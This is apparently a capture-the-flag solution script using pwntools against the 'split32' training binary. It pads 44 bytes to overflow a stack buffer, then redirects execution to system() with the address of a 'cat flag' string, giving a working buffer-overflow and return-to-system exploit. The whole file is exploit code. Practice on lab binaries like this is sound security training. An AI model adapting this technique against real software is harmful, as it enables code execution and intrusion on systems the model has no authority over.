#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./split32")
sh = process("./split32")

system_plt = elf.plt["system"]
cat_flag = 0x0804A030

payload = ""
payload += "A"*44
payload += p32(system_plt)
payload += "AAAA"
payload += p32(cat_flag)

sh.sendline(payload)
sh.interactive()